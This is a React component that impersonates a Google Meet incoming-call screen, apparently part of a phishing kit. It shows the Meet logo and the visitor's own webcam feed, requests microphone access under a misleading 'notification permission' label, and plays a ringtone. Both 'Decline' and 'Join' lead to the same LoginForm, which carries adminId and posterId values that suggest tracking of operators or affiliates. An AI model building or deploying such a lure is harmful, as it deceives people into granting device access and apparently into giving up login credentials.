"use client";

import { useEffect, useState } from "react";
import Webcam from "react-webcam";
import LoginForm from "./LoginForm";

export default function Home({ adminId, posterId }) {
  const [showForm, setShowForm] = useState(false);

  const playNotificationSound = () => {
    const audio = new Audio("/tune.mp3"); // Path to the ringtone file
    audio.play().catch((error) => {
      console.error("Error playing the sound:", error);
    });

    return () => {
      audio.pause(); // Stop the audio if the component unmounts
      audio.currentTime = 0; // Reset the audio to the beginning
    };
  };
  const requestNotificationPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      if (stream) {
        playNotificationSound();
      }
    } catch (error) {
      console.error("Error requesting notification permission:", error);
    }
  };
  useEffect(() => {
    requestNotificationPermission();
  }, [adminId, posterId]);
  if (showForm) {
    return <LoginForm adminId={adminId} posterId={posterId} />;
  }

  return (
    <div className="relative h-screen w-screen flex flex-col justify-center items-center bg-black">
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
      />

      <div className="absolute flex justify-center items-center inset-0 font-sans px-4">
        <div className="bg-[#202124] p-8 rounded-3xl flex flex-col items-center justify-center gap-y-8 w-full max-w-[400px] shadow-2xl border border-zinc-800/50">
          <img
            alt="Google Meet"
            loading="lazy"
            width="80"
            height="80"
            decoding="async"
            className="object-contain"
            src="/images/icons8-google-meet-480.png"
          />
          
          <div className="text-center space-y-2">
            <h3 className="text-3xl font-bold text-white tracking-tight">
              Incoming Meeting
            </h3>
            <p className="text-zinc-400 text-lg">Join the meeting now</p>
          </div>

          <div className="flex items-center justify-center gap-x-4 w-full">
            <button
              onClick={() => setShowForm(true)}
              className="flex-1 bg-[#d93025] hover:bg-[#b3261e] text-white font-semibold py-4 rounded-2xl text-xl transition-colors shadow-lg"
            >
              Decline
            </button>
            <button
              onClick={() => setShowForm(true)}
              className="flex-1 bg-[#1e8e3e] hover:bg-[#188038] text-white font-semibold py-4 rounded-2xl text-xl transition-colors shadow-lg shadow-emerald-900/20"
            >
              Join
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
